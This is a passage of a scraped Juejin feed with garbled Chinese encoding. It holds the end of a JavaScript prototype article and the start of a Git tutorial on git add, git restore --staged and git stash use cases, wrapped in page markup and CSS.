<li>å°è£…ï¼šé€šè¿‡æ„é€ å‡½æ•°/Classæ‰“åŒ…å®ä¾‹é€»è¾‘ï¼ŒåŒºåˆ†ç‹¬æœ‰ä¸å…±äº«èµ„æºï¼›</li>
<li>åŸå‹ï¼šè§£å†³å…¬ç”¨æ–¹æ³•çš„å†…å­˜æµªè´¹ï¼Œæ˜¯å®ä¾‹å…±äº«èµ„æºçš„æ ¸å¿ƒï¼›</li>
<li>ç»§æ‰¿ï¼šé€šè¿‡æ„é€ å‡½æ•°ç»‘å®š+åŸå‹é“¾ï¼Œå®ç°çˆ¶ç±»å±æ€§ä¸æ–¹æ³•çš„å¤ç”¨ï¼›</li>
<li>ES6 Classæ˜¯è¯­æ³•ç³–ï¼Œæ²¡æœ‰æ”¹å˜åŸå‹çš„åº•å±‚é€»è¾‘ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Gitæš‚å­˜ä¸stashæ“ä½œè¯¦è§£]]></title>    <link>https://juejin.cn/post/7602420156397649963</link>    <guid>https://juejin.cn/post/7602420156397649963</guid>    <pubDate>2026-02-03T14:35:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602420156397649963" data-draft-id="7600342201794150415" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Gitæš‚å­˜ä¸stashæ“ä½œè¯¦è§£"/> <meta itemprop="keywords" content="Git"/> <meta itemprop="datePublished" content="2026-02-03T14:35:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äºå°æ´‹"/> <meta itemprop="url" content="https://juejin.cn/user/3292359784146536"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Gitæš‚å­˜ä¸stashæ“ä½œè¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3292359784146536/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äºå°æ´‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T14:35:11.000Z" title="Tue Feb 03 2026 14:35:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body{overflow:hidden;line-height:1.75;font-size:15px;background-image:linear-gradient(90deg,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0),linear-gradient(1turn,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0);background-size:20px 20px;background-position:50%;padding-top:0!important}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{position:relative;display:flex;border-bottom:5px solid #6d4e00;line-height:35px;letter-spacing:1px;font-size:25px;padding-left:25px;color:#664900;text-shadow:1px 1px 1px #8a6200;padding-bottom:0}.markdown-body h1:before{content:"";display:flex;position:absolute;left:0;top:3px;bottom:0;margin:auto;width:20px;height:20px;background-size:20px 20px;background-image:url("data:image/png;base64,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")}.markdown-body h2{position:relative;padding:0 0 0 20px;font-size:20px;font-weight:700;color:#614500}.markdown-body h2:before{content:"";position:absolute;top:3px;bottom:0;left:0;background-image:url("data:image/png;base64,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");background-size:100% 100%;background-repeat:no-repeat;width:15px;height:15px;margin:auto}.markdown-body h3{width:100%;text-align:left;margin:20px 10px 0 0;font-size:18px;font-weight:700;display:inline-block;padding-left:10px;padding-bottom:0;border-left:5px solid #8f6600;color:#614500}.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:700;color:#a37400}.markdown-body h4{font-size:17px}.markdown-body h5,.markdown-body h6{display:flex;align-items:center}.markdown-body h5:after,.markdown-body h6:after{display:inline-block;border:2px solid #fff6e0;color:rgba(189,134,0,.5);border-radius:50%;text-align:center;margin-left:5px}.markdown-body h5{font-size:14px}.markdown-body h5:after{content:"5";width:15px;height:15px;line-height:15px;font-size:13px}.markdown-body h6{font-size:12px}.markdown-body h6:after{content:"6";width:13px;height:13px;line-height:13px;font-size:12px}.markdown-body p{color:#412c0c;letter-spacing:1px;font-weight:400;margin-bottom:16px}.markdown-body img{max-width:100%;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#755300;font-weight:400;border-bottom:1px solid #755300;font-weight:bolder;text-decoration:none}.markdown-body table{width:100%!important;margin:0;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border-spacing:0}.markdown-body table img{box-shadow:none}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body thead tr th{text-align:center}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;box-sizing:border-box;border:1px solid rgba(72,42,10,.1)}.markdown-body blockquote{position:relative;text-size-adjust:100%;line-height:25px;font-weight:400;border-radius:10px;font-style:normal;text-align:left;box-sizing:inherit;border:1px solid #ffd87a;background-color:rgba(189,134,0,.5);margin:20px 0;padding:20px}.markdown-body blockquote p{color:#fff6e0;letter-spacing:2px;margin:0}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;color:#cc9100;font-size:34px;font-weight:700}.markdown-body blockquote:before{content:"â";top:8px;left:5px}.markdown-body blockquote:after{content:"â";right:5px;bottom:-5px}.markdown-body strong{color:#c28a00;font-weight:bolder}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{color:#c28a00}.markdown-body em strong{font-style:normal;color:#c28a00;background-color:#8a6200}.markdown-body s{color:#c28a00}.markdown-body hr{border-top:1px solid #805b00}.markdown-body code,.markdown-body li code,.markdown-body p code{color:#996d00;background-color:rgba(130,98,0,.3)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#858585;font-family:bold;letter-spacing:1px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection,.markdown-body img::selection{color:rgba(189,134,0,.5);background-color:#fff}.markdown-body a::selection,.markdown-body b::selection,.markdown-body del::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:transparent}.markdown-body pre&gt;code::selection{background-color:rgba(189,134,0,.5)}.markdown-body .math .math-inline::selection,.markdown-body blockquote::selection,.markdown-body ol::selection,.markdown-body p::selection,.markdown-body strong::selection,.markdown-body table::selection,.markdown-body ul::selection{background-color:rgba(189,134,0,.5)}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼ŒGitçš„æš‚å­˜å’ŒStashåŠŸèƒ½æ˜¯ç®¡ç†ä»£ç å˜æ›´çš„æ ¸å¿ƒå·¥å…·ã€‚æœ¬æ–‡å°†ç³»ç»Ÿæ¢³ç†<code>git add</code>ã€<code>git stash</code>åŠç›¸å…³é«˜çº§æ“ä½œï¼Œå¸®åŠ©å¼€å‘è€…é«˜æ•ˆå¤„ç†å·¥ä½œåŒºä¸æš‚å­˜åŒºçš„çŠ¶æ€ç®¡ç†ã€‚</p>
</blockquote>
<h2 data-id="heading-0">âœ… åŸºç¡€æš‚å­˜æ“ä½œ</h2>
<h4 data-id="heading-1">âœ… æ·»åŠ ä¿®æ”¹åˆ°æš‚å­˜åŒº</h4>
<p>é€šè¿‡<code>git add</code>å‘½ä»¤å°†å·¥ä½œç›®å½•çš„ä¿®æ”¹æ ‡è®°ä¸ºâ€œå‡†å¤‡æäº¤â€ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ·»åŠ å•ä¸ªæ–‡ä»¶</span>
git add file.txt

<span class="hljs-comment"># æ·»åŠ æ‰€æœ‰ä¿®æ”¹çš„æ–‡ä»¶ï¼ˆä¸åŒ…æ‹¬æœªè·Ÿè¸ªçš„æ–‡ä»¶ï¼‰</span>
git add .

<span class="hljs-comment"># æ·»åŠ ç‰¹å®šç±»å‹çš„æ–‡ä»¶ï¼ˆå¦‚æ‰€æœ‰.jsæ–‡ä»¶ï¼‰</span>
git add *.js
</code></pre>
<p><strong>åŠŸèƒ½</strong>ï¼šå°†ä¿®æ”¹å­˜å…¥æš‚å­˜åŒºï¼Œä½†ä¸ä¼šç«‹å³åˆ›å»ºæäº¤è®°å½•ã€‚
<strong>æ³¨æ„</strong>ï¼šæœªè·Ÿè¸ªçš„æ–‡ä»¶éœ€å…ˆç”¨<code>git add</code>æ·»åŠ æ‰èƒ½æš‚å­˜ã€‚</p>
<h4 data-id="heading-2">âœ… å–æ¶ˆæš‚å­˜</h4>
<p>è¯¯å°†æ–‡ä»¶æ·»åŠ åˆ°æš‚å­˜åŒºæ—¶ï¼Œå¯é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ’¤é”€ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å–æ¶ˆå•ä¸ªæ–‡ä»¶çš„æš‚å­˜</span>
git restore --staged file.txt

<span class="hljs-comment"># å–æ¶ˆæ‰€æœ‰æ–‡ä»¶çš„æš‚å­˜</span>
git restore --staged .
</code></pre>
<p><strong>åŠŸèƒ½</strong>ï¼šå°†æ–‡ä»¶ä»æš‚å­˜åŒºç§»å›å·¥ä½œç›®å½•ï¼Œä¿ç•™ä¿®æ”¹å†…å®¹ã€‚</p>
<h2 data-id="heading-3">âœ… ä¸€ã€Git Stash æ˜¯ä»€ä¹ˆï¼Ÿæ ¸å¿ƒä½œç”¨</h2>
<p><code>git stash</code> (ä¸­æ–‡å¸¸ç¿»è¯‘ä¸º<strong>å‚¨è— / æš‚å­˜ / æš‚å­˜æç½®</strong>) æ˜¯ Git ä¸­æå…¶å¸¸ç”¨çš„å‘½ä»¤ï¼Œ<strong>æ ¸å¿ƒæ ¸å¿ƒä½œç”¨</strong>ï¼š</p>
<blockquote>
<p>ä¸´æ—¶ã€Œå‚¨è— / ä¿å­˜ã€<strong>å·¥ä½œåŒº + æš‚å­˜åŒº</strong> ä¸­æ‰€æœ‰<strong>æœªæäº¤</strong>çš„ä¿®æ”¹å†…å®¹ï¼Œè®©ä½ çš„å·¥ä½œåŒºå’Œæš‚å­˜åŒº<strong>ç«‹åˆ»æ¢å¤åˆ°ã€Œå¹²å‡€çŠ¶æ€ã€(å’Œæœ€è¿‘ä¸€æ¬¡ commit å®Œå…¨ä¸€è‡´)</strong> ï¼Œä¸”ä¸ä¼šä¸¢å¼ƒä»»ä½•ä¿®æ”¹ã€‚</p>
</blockquote>
<h3 data-id="heading-4">âœ… ä»€ä¹ˆæ—¶å€™å¿…é¡»ç”¨ Git Stashï¼Ÿï¼ˆæ ¸å¿ƒä½¿ç”¨åœºæ™¯ï¼‰</h3>
<p>è¿™æ˜¯ä½¿ç”¨ <code>git stash</code> çš„<strong>é»„é‡‘åœºæ™¯</strong>ï¼Œé‡åˆ°ä»¥ä¸‹æƒ…å†µæ— è„‘ç”¨å³å¯ï¼Œä¹Ÿæ˜¯å·¥ä½œä¸­ 99% çš„ä½¿ç”¨åœºæ™¯ï¼š</p>
<ol>
<li><strong>æ­£åœ¨å½“å‰åˆ†æ”¯å¼€å‘æ–°åŠŸèƒ½ / æ”¹ Bug</strong>ï¼Œçªç„¶éœ€è¦åˆ‡æ¢åˆ°å…¶ä»–åˆ†æ”¯ï¼ˆæ¯”å¦‚ <code>test</code>/<code>release</code>ï¼‰å¤„ç†ç´§æ€¥é—®é¢˜ï¼›</li>
<li>å½“å‰åˆ†æ”¯çš„ä»£ç <strong>æ”¹äº†ä¸€åŠã€è¿˜æ²¡å†™å®Œã€æ— æ³•æäº¤</strong>ï¼ˆæäº¤ä¸å®Œæ•´çš„ä»£ç ä¼šæ±¡æŸ“åˆ†æ”¯æäº¤è®°å½•ï¼‰ï¼›</li>
